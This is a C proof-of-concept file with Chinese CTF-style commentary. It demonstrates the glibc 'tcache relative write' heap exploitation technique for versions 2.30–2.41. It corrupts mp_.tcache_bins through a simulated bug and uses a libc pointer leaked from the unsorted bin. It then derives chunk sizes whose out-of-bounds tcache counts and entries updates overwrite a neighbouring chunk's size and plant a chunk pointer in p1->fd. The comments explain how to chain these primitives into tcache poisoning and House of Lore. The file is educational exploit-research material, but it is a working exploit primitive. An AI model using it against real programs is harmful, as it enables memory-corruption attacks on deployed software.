/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_relative_write
 * 文件标注范围：2.38 ~ 2.41
 * 模拟漏洞：对 tcache_perthread_struct 的相对越界写。
 * 核心流程：通过修改计数与头指针，把十进制计数值或 chunk 指针写到堆内相邻目标。版本差异来自 counts 宽度、safe-linking 和元数据布局。
 * 成功判据：assert 验证目标字段得到预期相对值；2.42 的 num_slots/entries 重构终止旧布局原语。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <malloc.h>

int main(void)
{
    /*
     * 本文件演示 TCache Relative Write。参考资料：
     * https://d4r30.github.io/heap-exploit/2025/11/25/tcache-relative-write.html
     *
     * 2.30~2.41 的 tcache_put/tcache_get 以 tc_idx 索引
     * tcache_perthread_struct 中的 counts 与 entries；正常上界来自
     * mp_.tcache_bins。如果先把 mp_.tcache_bins 改成大于 64 的巨值，再释放
     * 一个超过常规 tcache 最大尺寸的 chunk，越界 tc_idx 仍会被当作合法，
     * counts[tc_idx] 与 entries[tc_idx] 的更新便越过元数据结构，落到后续
     * 堆地址。选择请求尺寸就等价于选择相对写入偏移。
     *
     * 两类输出原语：
     * - counts 自增/自减可向堆上相对目标写入 0~7；若同时放大
     *   mp_.tcache_count，可通过重复收发扩展为更大的半任意整数写；
     * - entries 更新可把攻击者释放的 chunk 指针写到堆上相对目标，可继续
     *   组合 tcache poisoning、fastbin corruption、House of Lore 或堆泄漏。
     *
     * 所需前提：
     * - UAF/堆溢出等能力，能向 mp_.tcache_bins 写入大于 64 的值；
     * - libc 泄漏，用于定位 malloc_par 中的 mp_.tcache_bins；
     * - 能申请并释放高于正常 tcache 上限 0x408 的精确尺寸 chunk。
     *
     * safe-linking 会影响 entries 中链指针的编码含义，却不阻止“越界索引写”
     * 这个根本思想。glibc 2.42 把 counts 语义改为 num_slots 并重排 entries，
     * 原始公式与收发副作用不再成立。原 PoC 作者：D4R30（Mahdyar Bahrami）。
     */

    setbuf(stdout, NULL);

    unsigned long *p1 = malloc(0x410);	// 可溢出或 UAF 的来源块；其 unsorted fd 还用于定位 libc。
    unsigned long *p2 = malloc(0x100);	// 相邻目标块；先演示改大其 size 造成重叠。
    size_t p2_orig_size = p2[-1];
    
    free(p1);	// 0x420 物理尺寸超过正常 tcache 上限，进入 unsorted 并在 p1[0] 留下 libc 指针。

    /* 漏洞模拟开始/结束 */

    // 第一步：向 mp_.tcache_bins 写入巨值，解除 tc_idx 的正常上界。
    // 这里不要求完整任意写，只要能把一个大于 64 的非零值写到该字段即可。
    // 真题可利用程序自身逻辑，或把 UAF/溢出与 largebin attack、
    // fastbin_reverse_into_tcache、House of Mind fastbin 变体等原语组合。

    unsigned long *mp_tcache_bins = (void*)p1[0] - 0x938;   // 从 unsorted 的 main_arena 指针按本版本偏移反算 &mp_.tcache_bins。

    *mp_tcache_bins = 0x7fffffffffff;	// 把合法 tcache bin 数从 64 伪造为巨值，令越界 tc_idx 通过检查。

    // 若还能同时放大 mp_.tcache_count，重复收发可扩展为更强的整数写；只修改
    // mp_.tcache_bins 时，默认每个 bin 容量为 7，目标计数通常只能落在 0~7。

    /* 漏洞模拟结束：后续只通过正常 malloc/free 消费被修改的全局参数。 */

    /*
     * 下一步反算精确 tc_idx，使 tcache_put 对 counts[tc_idx] 与
     * entries[tc_idx] 的写入越过 tcache_perthread_struct，正好命中目标。
     * tc_idx 由请求对应的内部 chunk size 决定，因此攻击者通过选择 malloc
     * 尺寸来选择相对偏移。唯一的索引上界 tc_idx < mp_.tcache_bins 已在
     * 第一步绕过。
     */

    // 第二步：根据目标与 tcache 元数据的相对距离，计算要申请再释放的 chunk size。
    /*
     * 令 nb 为 free 时的内部 chunk size。x86-64 上
     * MALLOC_ALIGNMENT=0x10、MINSIZE=0x20，宏换算为：
     *
     *     索引公式：csize2tidx(nb) = (nb - MINSIZE + 0xf) / 0x10；
     *     因整数除法，可写成 tc_idx = (nb-16)/16 - 1。
     *
     * 所以 nb=0x20 对应索引 0，nb=0x30 对应索引 1，之后每增加 0x10，
     * tc_idx 增加 1。再结合数组元素宽度，可得到：
     *
     *     entries 写址 = entries 起点 + (nb-16)/2 - 8；
     *     counts  写址 = counts  起点 + (nb-16)/8 - 2。
     *
     * 若目标与相应数组起点的字节差为 delta，反解为：
     *
     *     指针相对写：nb = 2*(delta+8)+16；
     *     计数相对写：nb = 8*(delta+2)+16。
     *
     * 只需要相对距离，不需要 tcache_perthread_struct 的绝对堆地址。例如目标
     * counts 半字位于 counts 起点后 0x6a8，则 ASLR 改变两者共同基址，却不
     * 改变 delta=0x6a8，因此该部分不额外要求堆泄漏。
     */

    // 第三步：把相对计数写和相对指针写分别组合成可见的高层利用原语。
    // 本 PoC 选择“放大 p2 size 形成重叠块”和“向 p1->fd 写入被释放 chunk 指针”
    // 两个例子。它们不是唯一终点：重复释放/取出可累计计数值，指针写还可继续
    // 连接 tcache poisoning、fastbin corruption、House of Lore 等手法。

    // 示例一：用 counts 相对写破坏 p2->size，制造大尺寸重叠块。
    // 目标是让一次 counts[tc_idx] 更新恰好落在 p2 的 size 字段；先计算该字段
    // 与 tcache counts 起点的 delta，再代入当前版本的反算公式得到 nb。

    void *tcache_counts = (void*)p1 - 0x290; 	// 根据首批堆布局回退到 tcache->counts 起点。
    unsigned long delta = ((void*)p2 - 6) - tcache_counts;

    // 2.30~2.41 的 counts 元素宽 2 字节，代入指针运算可得 nb = 8*(delta+2)+16。
    unsigned long nb = 8*(delta+2)+16;

    // 申请用户大小 nb-0x10，使内部 chunk size 正好为 nb，释放时命中目标计数地址。
    unsigned long *p = malloc(nb-0x10);	
    
    // free 调用 tcache_put，越界 counts[tc_idx] 自增并改写 p2->size。
    free(p);
    
    // 严格断言 p2->size 已大于原值，排除只完成了普通释放的假阳性。
    assert(p2[-1] > p2_orig_size);

    // 按被放大的 size 释放 p2，随后用远大于原 0x100 的请求取回同一地址。
    free(p2);
    p = malloc(0x10100); 

    // 返回地址必须精确等于 p2，证明重叠块原语真正成立。
    assert(p == p2);

    // 示例二：让 entries 相对写把一个被释放 chunk 的指针写入任意堆上相对位置。
    // 这类指针写可直接作为后续 tcache poisoning、fastbin corruption 或
    // House of Lore 的链表构造基础。

    // 计算 p1->fd 目标与 tcache->entries 起点之间的相对距离 delta。
    void *tcache_entries = (void*)p1 - 0x210;  // 按固定首批堆布局回退到 tcache->entries 起点。
    delta = (void*)p1 - tcache_entries;

    // entries 元素宽 8 字节，按前述推导反算 nb = 2*(delta+8)+16。
    nb = 2*(delta+8)+16; 

    p = malloc(nb-0x10); 

    // 释放 p 时，越界 entries[tc_idx] 更新应把 p 的链表值写入 p1->fd。

    free(p);

    assert(p1[0] == (unsigned long)p);

    // 至此得到相对 chunk 指针写；可继续组合 tcache poisoning、低版本 fastbin corruption 或 House of Lore。
}
